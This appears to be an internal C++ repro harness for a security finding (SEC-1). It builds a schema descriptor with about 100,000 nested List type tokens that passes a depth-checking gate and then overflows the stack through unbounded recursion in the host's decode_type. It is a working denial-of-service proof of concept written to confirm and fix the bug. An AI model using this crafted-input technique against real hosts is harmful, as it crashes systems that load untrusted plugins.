// SPDX-License-Identifier: MPL-2.0
// Copyright (c) 2026 Joshua DeMoss

// Lead's own independent repro of SEC-1: unbounded recursion in decode_type when the
// TRUSTED host reconstructs an UNTRUSTED mod's manifest schema. No mirroring of the
// verifier's file — built from the headers directly.
//
// Build a schema descriptor whose single field's type-token stream is a FLAT list of
// N List tokens followed by one Int token (i.e. List<List<...<Int>>>, N deep). This is
// exactly what a malicious .so's describe() could emit. The value-tree is shallow (~6
// deep), so the gate's kMaxBinaryDepth=64 cap does NOT reject it — but decode_type
// recurses once per List token and blows the stack.
#include <zen/kernel/schema_codec.hpp>   // decode_schema, *_schema(), header-only
#include <zen/serialize.hpp>
#include <zen/gate.hpp>

#include <cstdio>
#include <cstdlib>
#include <vector>

using namespace loom;

int main(int argc, char** argv) {
    const int N = (argc > 1) ? std::atoi(argv[1]) : 100000;

    // Build the flat token list in a LOOP (no recursion in the harness itself).
    std::vector<Cell> tokens;
    tokens.reserve(static_cast<std::size_t>(N) + 1);
    for (int i = 0; i < N; ++i) {
        Value list_tok(type_token_schema());
        list_tok.set("kind", Cell::integer(static_cast<std::int64_t>(Kind::List))); // 6
        tokens.push_back(Cell::message(std::move(list_tok)));
    }
    Value int_tok(type_token_schema());
    int_tok.set("kind", Cell::integer(static_cast<std::int64_t>(Kind::Int)));       // 0
    tokens.push_back(Cell::message(std::move(int_tok)));

    // One field carrying that token stream.
    Value fd(field_desc_schema());
    fd.set("name", Cell::text("x"));
    fd.set("required", Cell::boolean(true));
    fd.set("type", Cell::list(std::move(tokens)));

    // The schema descriptor (this is the mod's state schema in the manifest).
    Value desc(schema_desc_schema());
    desc.set("name", Cell::text("Evil"));
    desc.set("version", Cell::integer(1));
    desc.set("fields", Cell::list({Cell::message(std::move(fd))}));

    // Round-trip through the SAME gate the host uses, to prove the gate admits it.
    const std::string bytes = serialize(desc);
    std::printf("manifest field-schema: %d List tokens, %zu serialized bytes\n", N, bytes.size());
    Unverified u = parse(bytes);
    Admission a = admit(u, schema_desc_schema());
    std::printf("GATE VERDICT: %s\n", a.ok() ? "ADMITTED" : "refused");
    if (!a.ok()) { std::printf("  (gate refused; not the SEC-1 path)\n"); return 2; }
    std::fflush(stdout);

    // Host-side reconstruction — this is host.cpp reconstruct_and_cache's decode_schema.
    Registry deps;
    auto rebuilt = decode_schema(a.value(), deps);   // <-- decode_type recurses N deep here
    std::printf("decode_schema RETURNED (no crash): %s v%u\n",
                rebuilt->name().c_str(), rebuilt->version());
    return 0;
}
